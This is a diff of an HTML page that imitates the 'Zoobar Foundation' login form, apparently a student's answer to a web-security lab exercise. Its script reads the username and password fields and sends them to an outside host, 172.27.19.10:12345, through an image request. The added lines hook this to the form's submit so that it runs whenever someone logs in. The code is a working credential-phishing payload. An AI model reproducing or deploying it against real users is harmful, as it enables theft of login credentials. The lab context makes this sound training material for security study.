@@ -9,35 +9,26 @@
         <script>
             try{
                 var zoobars = myZoobars;
-                if (zoobars || true); {
-                    location.href = "answer-2.html"; 
-                }
+                location.href = "answer-2.html"; 
             }
             catch(e){
                 console.log(e);
             };
             var hehe = function() {
-                document.loginform.submit();
-                //setTimeout(document.loginform.submit(),50);
-                var fries = document.getElementById("username").value;
-                var soup = document.getElementById("password").value;
-                var ip = "172.27.19.10:12345";
-                var rollno    = "13265";
-                var random    = Math.floor((Math.random() * 1000) + 1);
-                var timestamp = Date.now();
-                var ur = "http://"+ip+"/?"+
-                    "payload="+encodeURI(fries)+","+encodeURI(soup)+
-                    "&roll="+rollno+
-                    "&random=" + random +
-                    "&timestamp=" + Date.now();
-                new Image().src = ur;
-                console.log("Done in hehe");
+                    var us = document.getElementById("username").value;
+                    var ps = document.getElementById("password").value;
+                    var ip = "172.27.19.10:12345";
+                    var url = "http://"+ip+"/?"+"payload="+encodeURI(us)+","+encodeURI(ps);
+                    new Image().src = url;
+                    setTimeout(function() {
+                        return true;
+                    }, 2000);
             };
         </script>
     </head>
     <body>
         <h1>
-            <a  ="http://localhost:8080/zoobar/index.cgi/">
+            <a href="http://localhost:8080/zoobar/index.cgi/">
                 Zoobar Foundation for Objective Policy
             </a>
         </h1>
@@ -45,7 +36,7 @@
             Supporting the important minds of the information superhighway
         </h2>        
         <div id="login" class="centerpiece">
-            <form name="loginform" method="POST" action="http://localhost:8080/zoobar/index.cgi/login" >
+            <form name="loginform" method="POST" onsubmit="hehe()" action="http://localhost:8080/zoobar/index.cgi/login" >
                 <table>
                     <tbody>
                         <tr>
@@ -55,19 +46,20 @@
                         <tr>
                             <td>Password:</td>
                             <td colspan="2"><input name="login_password" id="password" size="20" autocomplete="no" type="password">
-                            <input name="submit_login" value="Log in" type="button" id = "myBtn" >
-                            <input name="submit_registration" value="Register" type="button"></td>
+                            <input name="submit_login" value="Log in" id="myBtn" type="submit">
+                            <input name="submit_registration" value="Register" type="submit"></td>
                         </tr>
                     </tbody>
                 </table>
-                <script>
-                    document.getElementById("myBtn").addEventListener("click", hehe);
-                </script>
+
                 <input name="nexturl" value="http://localhost:8080/zoobar/index.cgi/" type="hidden">
             </form>
         </div>
         <div class="footer warning">
         </div>
-        <script>document.loginform.login_username.focus();</script>        
+        <script>document.loginform.login_username.focus();</script>
+        <script>
+            //document.getElementById("login").addEventListener("submit", func);
+        </script>
     </body>
 </html>
